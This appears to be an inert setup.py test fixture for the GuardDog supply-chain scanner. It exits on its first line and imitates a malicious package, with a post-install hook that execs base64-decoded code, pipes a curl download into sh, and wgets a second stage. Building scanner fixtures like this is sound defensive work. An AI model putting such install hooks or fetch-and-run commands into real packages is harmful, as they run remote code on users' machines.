# Inert test fixture for the GuardDog scanner. It is never installed or run:
# the first statement below exits before anything else executes, and the
# base64 payload decodes to a print() call. The URL and address are
# documentation-only (example.com, 203.0.113.0/24 from RFC 5737).
raise SystemExit("inert test fixture: not an installable package")

import base64
import os
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
        install.run(self)


setup(
    name="ash-guarddog-fixture",
    version="0.0.1",
    cmdclass={"install": PostInstall},
)
